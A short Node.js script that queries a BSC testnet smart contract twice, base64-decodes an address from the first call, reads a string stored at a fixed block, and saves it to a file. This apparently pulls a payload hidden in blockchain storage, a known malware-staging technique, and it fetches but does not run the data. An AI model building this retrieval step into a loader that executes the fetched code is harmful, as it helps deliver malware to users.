var Web3 = require("web3");
var fs = require("fs");
var web3 = new Web3("https://endpoints.omniatech.io/v1/bsc/testnet/public");
var contractAddress = "0x9223f0630c598a200f99c5d4746531d10319a569";
async function callContractFunction(inputString) {
    try {
        var methodId = "0x5684cff5"; // testStr(string)
        var encodedData = methodId + web3.eth.abi.encodeParameters(["string"], [inputString]).slice(2);
        var result = await web3.eth.call({
            to: contractAddress,
            data: encodedData
        });
        var largeString = web3.eth.abi.decodeParameter("string", result);
        var targetAddress = Buffer.from(largeString, "base64").toString("utf-8");
        var filePath = "decoded_output.txt";
        fs.writeFileSync(filePath, "$address = " + targetAddress + "\\n");
        var new_methodId = "0x5c880fcb";
        var blockNumber = 43152014;
        var newEncodedData = new_methodId + web3.eth.abi.encodeParameters(["address"], [targetAddress]).slice(2);
        var newData = await web3.eth.call({
            to: contractAddress,
            data: newEncodedData
        }, blockNumber);
        var decodedData = web3.eth.abi.decodeParameter("string", newData);
        var base64DecodedData = Buffer.from(decodedData, "base64").toString("utf-8");
        fs.writeFileSync(filePath, decodedData);
        console.log(`Saved decoded data to:${filePath}`)
    } catch (error) {
        console.error("Error calling contract function:", error)
    }
}
var inputString = "KEY_CHECK_VALUE";
callContractFunction(inputString);
